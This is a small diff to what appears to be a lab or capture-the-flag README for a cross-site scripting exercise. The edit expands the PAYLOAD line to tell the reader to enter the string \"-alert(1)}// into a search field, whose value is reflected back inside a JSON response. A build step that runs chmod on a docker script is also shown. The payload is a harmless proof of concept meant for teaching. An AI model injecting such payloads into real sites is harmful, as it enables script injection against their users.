@@ -15,7 +15,7 @@
 > {"searchTerm":"\\"-alert(1)}//", "results":[]}
 
 ## PAYLOAD
-- ```\"-alert(1)}//```
+- Inside the search field, enter ```\"-alert(1)}//```
 
 ## How to:
 - ```chmod 700 build_docker```
